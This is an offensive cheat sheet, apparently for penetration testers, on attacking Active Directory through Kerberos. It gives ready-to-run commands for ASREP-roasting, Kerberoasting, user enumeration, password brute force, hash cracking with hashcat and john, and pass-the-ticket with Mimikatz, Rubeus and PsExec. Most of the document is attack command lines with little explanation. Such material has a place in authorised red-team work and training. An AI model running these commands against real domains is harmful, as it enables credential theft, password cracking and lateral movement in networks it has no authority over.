# Kerberoast

## Tools

**Rubeus:** [https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe)

**Kerbrute:** [https://github.com/ropnop/kerbrute](https://github.com/ropnop/kerbrute)

**Impacket:** [https://github.com/SecureAuthCorp/impacket](https://github.com/SecureAuthCorp/impacket)

## ASREP-Roast

### Impacket

```python
# ASREP check on all domain Users (Requires valid domain credentials)
python2 GetNPUsers.py <Domain>/<User>:<Password> -request -dc-ip <IP> -format <John|Hashcat> | grep "$krb5asrep$"

# ASREP check on a list of domain user (Does not require domain credentials)
python2 GetNPUsers.py <Domain> -usersfile <UserList>  -dc-ip <IP> -format <John|Hashcat> | grep "$krb5asrep$"
```

### Rubeus

```python
# Extract from all domain accounts
.\Rubeus.exe asreproast
.\Rubeus.exe asreproast /format:hashcat /outfile:C:Hashes.txt
```

### Cracking

```bash
# Windows
hashcat64.exe -m 18200 c:Hashes.txt rockyou.txt

# Linux
john --wordlist rockyou.txt Hashes.txt --format=krb5tgs
hashcat -m 18200 -a 3 Hashes.txt rockyou
```

## Brute Force

### Kerbrute

**Download:** [https://github.com/ropnop/kerbrute](https://github.com/ropnop/kerbrute)

```python
./kerbrute userenum <UserList> --dc <IP> --domain <Domain>
```

### Rubeus

```python
# with a list of users
.\Rubeus.exe brute /users:<UserList> /passwords:<Wordlist> /domain:<Domain>

# Check all domain users again password list
.\Rubeus.exe brute /passwords:<Wordlist>
```

## Kerberoasting

### Impacket

```python
GetUserSPNs.py <Domain>/<User>:<Password> -dc-ip <IP> -request
```

### Rubeus

```python
# Kerberoast all users in Domain
.\Rubeus kerberoast

# All Users in OU
.\Rubeus.exe kerberoast /ou:OU=Service_Accounts,DC=Security,DC=local

# Specific users
.\Rubeus.exe kerberoast /user:File_SVC
```

## Pass-The-Ticket

### Mimikatz

```python
# Collect tickets
sekurlsa::tickets /export

# Inject ticket
kerberos::ptt <.kirbi file>

# spawn CMD with the injected ticket
misc::cmd
```

### Rubeus

```python
# Collect tickets
.\Rubeus.exe dump

# Inject ticket
.\Rubeus.exe ptt /ticket:<.kirbi file>
```

### PsExec

```python
# To be used after injecting ticket with either Rubeus or Mimikatz
.\PsExec.exe -accepteula \\<IP> cmd
```

## Silver Ticket

{% embed url="https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/silver-ticket" %}

## Golden Ticket

{% embed url="https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/golden-ticket" %}
